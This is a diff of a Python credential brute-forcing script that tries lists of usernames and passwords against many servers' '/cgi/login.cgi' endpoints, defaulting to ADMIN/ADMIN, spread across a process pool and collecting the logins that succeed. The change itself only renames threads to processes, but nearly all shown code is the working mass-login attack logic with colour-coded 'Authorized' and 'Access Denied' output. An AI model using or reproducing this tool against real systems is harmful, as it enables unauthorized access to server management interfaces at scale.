@@ -20,7 +20,7 @@ status_color = {
 scheme = "http"
 login_endpoint = "/cgi/login.cgi"
 lock = Lock()
-thread_count = cpu_count()
+process_count = cpu_count()
 warnings.filterwarnings('ignore')
 
 def display(status, data, start='', end='\n'):
@@ -42,7 +42,7 @@ def login(server, username='ADMIN', password='ADMIN', scheme="http", timeout=Non
     except Exception as error:
         t2 = time()
         return error, t2-t1
-def brute_force(thread_index, servers, credentials, scheme="http", timeout=None):
+def brute_force(process_index, servers, credentials, scheme="http", timeout=None):
     successful_logins = {}
     for credential in credentials:
         status = ['']
@@ -51,28 +51,28 @@ def brute_force(thread_index, servers, credentials, scheme="http", timeout=None)
             if status[0] == True:
                 successful_logins[server] = [credential[0], credential[1]]
                 with lock:
-                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET}")
+                    display(' ', f"Process {process_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET}")
             elif status[0] == False:
                 with lock:
-                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
+                    display(' ', f"Process {process_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
             else:
                 with lock:
-                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
+                    display(' ', f"Process {process_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
     return successful_logins
 def main(servers, credentials, scheme="http", timeout=None):
     successful_logins = {}
-    pool = Pool(thread_count)
-    display('+', f"Starting {Back.MAGENTA}{thread_count} Brute Force Threads{Back.RESET}")
-    threads = []
+    pool = Pool(process_count)
+    display('+', f"Starting {Back.MAGENTA}{process_count} Brute Force Processs{Back.RESET}")
+    processs = []
     total_servers = len(servers)
-    server_divisions = [servers[group*total_servers//thread_count: (group+1)*total_servers//thread_count] for group in range(thread_count)]
+    server_divisions = [servers[group*total_servers//process_count: (group+1)*total_servers//process_count] for group in range(process_count)]
     for index, server_division in enumerate(server_divisions):
-        threads.append(pool.apply_async(brute_force, (index, server_division, credentials, scheme, timeout)))
-    for thread in threads:
-        successful_logins.update(thread.get())
+        processs.append(pool.apply_async(brute_force, (index, server_division, credentials, scheme, timeout)))
+    for process in processs:
+        successful_logins.update(process.get())
     pool.close()
     pool.join()
-    display('+', f"Threads Finished Excuting")
+    display('+', f"Processs Finished Excuting")
     return successful_logins
 
 if __name__ == "__main__":
